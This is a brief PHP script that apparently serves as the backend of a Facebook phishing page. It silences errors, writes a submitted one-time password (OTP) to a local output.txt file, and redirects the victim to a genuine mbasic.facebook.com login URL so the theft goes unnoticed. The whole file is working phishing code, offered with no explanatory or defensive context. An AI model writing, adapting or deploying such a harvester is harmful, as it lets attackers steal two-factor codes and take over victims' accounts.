<?php
error_reporting(0);
ini_set('display_errors', 0);
file_put_contents("output.txt", " Done " . $_POST['OTP'] . "\n", FILE_APPEND);
header('Location: https://mbasic.facebook.com/login/?next=https%3A%2F%2Fmbasic.facebook.com%2Fgroups%2F1873620679596423%3Frefid%3D27&email=&li=FXFvXxJHOxd1hu7GbJXY_Z1J&e=1348092&shbl=1&refsrc=https%3A%2F%2Fmbasic.facebook.com%2Fgroups%2F1873620679596423&_rdr');
exit();
